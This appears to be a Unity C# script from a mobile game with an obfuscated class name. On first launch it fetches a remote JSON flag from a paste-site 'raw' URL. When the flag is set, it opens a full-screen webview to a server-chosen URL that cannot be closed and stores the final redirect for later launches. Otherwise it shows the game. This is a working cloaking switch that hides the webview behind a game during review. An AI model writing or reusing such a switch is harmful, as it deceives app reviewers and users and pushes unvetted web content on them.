using System;
using System.Collections;
using System.Collections.Generic;
using System.Net;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using TMPro;
public class newwsdfgsdfvgsdcfvgc : MonoBehaviour
{
    UniWebView uniWebView;
    public string path;
    public string extra;
    private string url;
    public TMP_Text status;
    private string m_unityMainActivity = "com.unity3d.player.UnityPlayer";
    private AndroidJavaClass wvclass;
    private bool isWVStarted;
    private void Awake()
    {
        if (PlayerPrefs.HasKey("gamer"))
        {
            OpenGame();
            return;
        }
        if (PlayerPrefs.HasKey("lastUrl"))
        {
            url = PlayerPrefs.GetString("lastUrl", "https://www.youtube.com/");
            if (url.Length < 6)
            {
                status.text = "empty url";
            }
            else
            {
                status.text = url;
            }
            OpenWebview();
        }
        else if (GetWebData())
        {
            status.text = url;
            OpenWebview();
            PlayerPrefs.SetString("lastUrl", GetFinalRedirect(url));
            PlayerPrefs.Save();
        }
        else
        {
            PlayerPrefs.SetInt("gamer", 1);
            PlayerPrefs.Save();
            OpenGame();
        }
    }
    private void OnDisable()
    {
        uniWebView.OnShouldClose -= (view) => {
            return false;
        };
    }
    private void Update()
    {
    }
    private bool GetWebData()
    {
        bool tempbool = false;
        WebClient client = new WebClient();
        path = path + extra;
        path = path.Insert(path.IndexOf("com/") + 4, "raw/");
        try
        {
            string htmlData = client.DownloadString(path);
            HtmlStruct htmlStruct = JsonUtility.FromJson<HtmlStruct>(htmlData);
            url = htmlStruct.orig;
            tempbool = htmlStruct.turner;
        }
        catch
        {
            return tempbool = false;
        }
        return tempbool;
    }
    private void OpenGame()
    {
        SceneManager.LoadScene(SceneManager.GetActiveScene().buildIndex + 1);
    }
    private void OpenWebview()
    {
        var webviewObject = new GameObject("UniWebview");
        uniWebView = webviewObject.AddComponent<UniWebView>();
        uniWebView.Frame = new Rect(0, 0, Screen.width, Screen.height);
        uniWebView.SetToolbarDoneButtonText("");
        uniWebView.SetShowToolbar(true, false, true, true);
        uniWebView.Load(url);
        isWVStarted = true;
        uniWebView.OnShouldClose += (view) => {
            return false;
        };
        uniWebView.Show();
    }
    private IEnumerator Wait1S()
    {
        yield return new WaitForSeconds(0.4f);
        SceneManager.LoadScene(SceneManager.GetActiveScene().buildIndex);
    }
    private string GetFinalRedirect(string url)
    {
        if (string.IsNullOrWhiteSpace(url))
            return url;

        int maxRedirCount = 8; 
        string newUrl = url;
        do
        {
            HttpWebRequest req = null;
            HttpWebResponse resp = null;
            try
            {
                req = (HttpWebRequest)HttpWebRequest.Create(url);
                req.Method = "HEAD";
                req.AllowAutoRedirect = false;
                resp = (HttpWebResponse)req.GetResponse();
                switch (resp.StatusCode)
                {
                    case HttpStatusCode.OK:
                        return newUrl;
                    case HttpStatusCode.Redirect:
                    case HttpStatusCode.MovedPermanently:
                    case HttpStatusCode.RedirectKeepVerb:
                    case HttpStatusCode.RedirectMethod:
                        newUrl = resp.Headers["Location"];
                        if (newUrl == null)
                            return url;

                        if (newUrl.IndexOf("://", System.StringComparison.Ordinal) == -1)
                        {
                            Uri u = new Uri(new Uri(url), newUrl);
                            newUrl = u.ToString();
                        }
                        break;
                    default:
                        return newUrl;
                }
                url = newUrl;
            }
            catch (WebException)
            {
                return newUrl;
            }
            catch (Exception ex)
            {
                return null;
            }
            finally
            {
                if (resp != null)
                    resp.Close();
            }
        } while (maxRedirCount-- > 0);
        return newUrl;
    }
}
public struct HtmlStruct
{
    public bool turner;
    public string orig;
}
